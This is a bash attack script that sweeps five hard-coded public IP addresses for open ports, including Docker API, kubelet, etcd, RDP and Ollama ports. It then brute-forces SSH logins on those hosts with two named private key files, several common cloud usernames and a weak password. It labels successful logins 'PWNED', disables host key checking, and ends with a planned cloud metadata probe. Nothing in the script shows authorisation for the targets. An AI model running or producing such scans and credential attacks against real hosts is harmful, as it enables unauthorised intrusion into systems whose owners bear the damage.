#!/bin/bash
K1=$PWD/az/ibm_key.pem; K2=$PWD/az/azadmin.pem; chmod 600 "$K1" "$K2"
echo "RUNNER=$(hostname) EGRESS=$(curl -s -m 8 https://ifconfig.me)"
IPS="20.197.62.105 20.115.114.95 4.151.72.8 4.193.185.193 20.59.127.108"
echo "=== WIDE PORT SWEEP ==="
for ip in $IPS; do
  for p in 22 80 443 3000 5000 8000 8080 8443 8888 9000 9090 2375 2376 2379 10250 10255 6443 9400 8265 3389 5985 5986 11434; do
    timeout 2 bash -c "echo > /dev/tcp/$ip/$p" 2>/dev/null && echo "OPEN $ip:$p"
  done
done
echo "=== KEY/USER MATRIX ==="
for ip in $IPS; do
  timeout 4 bash -c "echo > /dev/tcp/$ip/22" 2>/dev/null || continue
  for u in t19 azureuser adminuser ubuntu; do
    for k in "$K1" "$K2" azadmin; do
      kf="$k"; [ "$k" = "azadmin" ] && kf="$K2"
      out=$(ssh -i "$kf" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o PreferredAuthentications=publickey -o LogLevel=ERROR "$u@$ip" 'echo LOGIN_OK uid=$(id -u) host=$(hostname)' 2>&1 | head -2)
      echo "TRY $ip $u $(basename $k) => $out"
      case "$out" in *LOGIN_OK*) echo "PWNED $ip $u $kf";; esac
    done
  done
  # password auth small list on 22-open hosts
  out=$(sshpass -p 't19' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o LogLevel=ERROR t19@$ip 'echo LOGIN_OK' 2>&1 | head -1)
  echo "TRY $ip t19 password=t19 => $out"
done
echo "=== IMDS on any login? (none expected) ==="
